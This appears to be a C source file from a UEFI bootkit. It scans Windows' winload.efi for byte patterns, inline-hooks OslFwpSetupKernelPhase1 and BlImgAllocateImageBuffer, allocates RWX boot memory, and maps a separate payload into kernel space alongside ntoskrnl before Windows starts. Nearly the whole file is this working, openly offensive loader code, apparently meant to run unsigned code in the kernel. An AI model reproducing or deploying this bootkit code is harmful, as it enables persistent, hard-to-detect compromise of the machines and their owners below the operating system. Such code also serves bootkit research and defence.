#include <Uefi.h>

#include <Library/UefiLib.h>
#include <Library/PrintLib.h>

#include "utils.h"
#include "globals.h"
#include "hook.h"
#include "nt.h"
#include "Payload.h"
#include "Mapper.h"

#define APPLICATION_IMAGE_ALLOCATION_TYPE	0xE0000012
#define BOOT_ALLOCATION_RWX_ATTRIBUTES		0x424000

typedef EFI_STATUS(EFIAPI *OslFwpSetupKernelPhase1)(IN PLOADER_PARAMETER_BLOCK LoaderParameterBlock);

// "Reserved" arg doesn't really do anything and just passed in fuctions which works with physical adresses
// (BlMmAllocatePhysicalPagesInRange -> MmPapAllocatePhysicalPagesInRange)
typedef EFI_STATUS(EFIAPI *BlImgAllocateImageBuffer)(IN VOID **ImageBuffer, IN UINTN ImageSize, IN UINTN MemoryType, UINTN Attributes, VOID *Reserved, UINTN Flags);

UINT8 *PayloadBuf = NULL;

#pragma region winloadctx
STATIC CONST UINT8 OslFwpSetupKernelPhase1Pattern[] = {
	0x48, 0x89, 0x4C, 0x24, 0x08,	// mov     [rsp-8+arg_0], rcx
	0x55,							// push    rbp
	0x53,							// push    rbx
	0x56,							// push    rsi
	0x57,							// push    rdi
	0x41, 0x54,						// push    r12
	0x41, 0x55						// push    r13
};

// From RdpLoadImage (winload.efi)
STATIC CONST UINT8 BlImgAllocateImageBufferPattern[] = {
	0xE8, 0xCC, 0xCC, 0xCC, 0xCC,	// call    x
	0x4C, 0x8B, 0x6D, 0x60			// mov     r13, [rbp + arg]
};
#pragma endregion

HOOK hOslFwpSetupKernelPhase1;
HOOK hBlImgAllocateImageBuffer;


EFI_STATUS
EFIAPI
HkBlImgAllocateImageBuffer(
	IN VOID		**ImageBuffer,
	IN UINTN	ImageSize,
	IN UINTN	MemoryType,
	IN UINTN	Attributes,
	IN VOID		*Reserved,
	IN UINTN	Flags
) {
	EFI_STATUS Status = EFI_COMPROMISED_DATA;

	VOID *Original = hBlImgAllocateImageBuffer.OriginalAddress;

	UninstallHook(&hBlImgAllocateImageBuffer);

	Status = ((BlImgAllocateImageBuffer)Original)(ImageBuffer, ImageSize, MemoryType, Attributes, Reserved, Flags);
	if(!EFI_ERROR(Status)) {
		// There's also types like 0xD0000008, 0xD000000A (found in winload and bootmgfw). They used by 
		// loader and cannot be used by us.
		if(MemoryType == APPLICATION_IMAGE_ALLOCATION_TYPE) {		
			UINT64 PayloadSize = GetPESize(Payload);
			if(PayloadSize == 0) {
				SetGlobalPatchStatus(EFI_COMPROMISED_DATA, L"Invalid payload size", (VOID *)HkBlImgAllocateImageBuffer);

				return EFI_COMPROMISED_DATA;
			}

			Status = ((BlImgAllocateImageBuffer)Original)(&PayloadBuf, PayloadSize, APPLICATION_IMAGE_ALLOCATION_TYPE, BOOT_ALLOCATION_RWX_ATTRIBUTES, Reserved, 0);
			if(EFI_ERROR(Status)) {
				SetGlobalPatchStatus(Status, L"Cannot allocate memory for a payload", (VOID *)HkBlImgAllocateImageBuffer);

				return Status;
			}

			return EFI_SUCCESS;
		}
	}

	// Hook it again, until we get proper memory type
	InstallHook(&hBlImgAllocateImageBuffer);

	return Status;
}

EFI_STATUS
EFIAPI
HkOslFwpSetupKernelPhase1(
	IN PLOADER_PARAMETER_BLOCK	LoaderParameterBlock
) {
	// It looks like the functions from EFI_SYSTEM_TABLE "fall off" in Winload, 
	// so we don't use "Print" and the like here.
	EFI_STATUS Status = EFI_NOT_FOUND;

	VOID *Original = hOslFwpSetupKernelPhase1.OriginalAddress;

	UninstallHook(&hOslFwpSetupKernelPhase1);

	// Find ntoskrnl in load order
	PKLDR_DATA_TABLE_ENTRY NtosKrnlModule;
	NtosKrnlModule = FindModule(&LoaderParameterBlock->LoadOrderListHead, L"ntoskrnl.exe");
	if(NtosKrnlModule != NULL) {
		VOID *NtImageBase = NtosKrnlModule->DllBase;
		UINTN NtImageSize = NtosKrnlModule->SizeOfImage;

		// Another sanity check, bc I'm paranoidal
		if((NtImageBase != NULL) && (NtImageSize > 0)) {
			// Map payload
			if(PayloadBuf != NULL) {
				VOID *EntryPoint = NULL;

				Status = MpMapPayload((UINT8 *)NtImageBase, Payload, PayloadBuf, &EntryPoint);
				if(EFI_ERROR(Status))
					SetGlobalPatchStatus(Status, L"Cannot map payload", (VOID *)MpMapPayload);
				
				// forgot about it
				*(UINT64 *)(PayloadBuf) = NULL;
				*(UINT64 *)(PayloadBuf + 0x8) = NULL;
				*(UINT64 *)(PayloadBuf + 0x10) = (UINT64)EntryPoint;
			}
		} else {
			SetGlobalPatchStatus(EFI_COMPROMISED_DATA, L"Corrupted kernel", (VOID *)HkOslFwpSetupKernelPhase1);
		}
	} else {
		SetGlobalPatchStatus(Status, L"Cannot locate ntoskrnl in load order", (VOID *)HkOslFwpSetupKernelPhase1);
	}

	return ((OslFwpSetupKernelPhase1)Original)(LoaderParameterBlock);
}

EFI_STATUS
EFIAPI
CompromiseWinload(
	IN VOID						*ImageBase,
	IN UINTN					ImageSize,
	IN EFI_IMAGE_NT_HEADERS64	*NtHeaders64
) {
	EFI_STATUS Status = EFI_NOT_FOUND;

	// Clear old info from screen
	gST->ConOut->ClearScreen(gST->ConOut);

	Print(L"[ winload ]\n\r");
	Print(L"[+] Winload image base: 0x%llx\n\r", ImageBase);
	Print(L"[+] Winload image size: %lld\n\r", ImageSize);

	VOID *TextBase = NULL;
	UINTN TextSize = 0;

	// Find .text section
	EFI_IMAGE_SECTION_HEADER *TextSect = FindSection(NtHeaders64, ".text");
	if(TextSect == NULL) {
		Print(L"[?] Cannot find .text section! Scanning all binary..\n\r");

		TextBase = ImageBase;
		TextSize = ImageSize;
	} else {
		TextBase = (VOID *)RVA(ImageBase, TextSect->VirtualAddress);
		TextSize = TextSect->Misc.VirtualSize;
	}

	// Find OslFwpSetupKernelPhase1. We will skip searching  other things. 
	// On Windows 10+ only pattern of OslFwpSetupKernelPhase1 enough
	VOID *OriginalOslFwpSetupKernelPhase1 = ScanForPattern((UINT8 *)TextBase, TextSize, OslFwpSetupKernelPhase1Pattern);
	if(OriginalOslFwpSetupKernelPhase1 == NULL) {
		SetGlobalPatchStatus(Status, L"Cannot find OslFwpSetupKernelPhase1 stub pattern!", (VOID *)CompromiseWinload);

		return Status;
	}

	Print(L"\n\r[+] OslFwpSetupKernelPhase1 address: 0x%llx\n\r", OriginalOslFwpSetupKernelPhase1);
	Print(L"[+] HkOslFwpSetupKernelPhase1 address: 0x%llx\n\r", &HkOslFwpSetupKernelPhase1);

	InitHook(&hOslFwpSetupKernelPhase1, OriginalOslFwpSetupKernelPhase1, (VOID *)&HkOslFwpSetupKernelPhase1);
	InstallHook(&hOslFwpSetupKernelPhase1);

	// Because we need to allocate memory for our driver. There's no unique pattern of stub though..
	VOID *CallAllocateBuffer = ScanForPattern((UINT8 *)TextBase, TextSize, BlImgAllocateImageBufferPattern);
	if(CallAllocateBuffer == NULL) {
		SetGlobalPatchStatus(Status, L"Cannot find \"BlImgAllocateImageBuffer\" call pattern!\n\r", (VOID *)CompromiseWinload);

		return Status;
	}

	VOID *OriginalBlImgAllocateImageBuffer = CALC_ADDRESS(CallAllocateBuffer, 1);

	Print(L"\n\r[+] Call-pattern of BlImgAllocateImageBuffer found at: 0x%llx\n\r", CallAllocateBuffer);
	Print(L"[+] BlImgAllocateImageBuffer address: 0x%llx\n\r", OriginalBlImgAllocateImageBuffer);
	Print(L"[+] HkBlImgAllocateImageBuffer address: 0x%llx\n\r", &HkBlImgAllocateImageBuffer);

	InitHook(&hBlImgAllocateImageBuffer, OriginalBlImgAllocateImageBuffer, (VOID *)&HkBlImgAllocateImageBuffer);
	InstallHook(&hBlImgAllocateImageBuffer);

	return EFI_SUCCESS;
}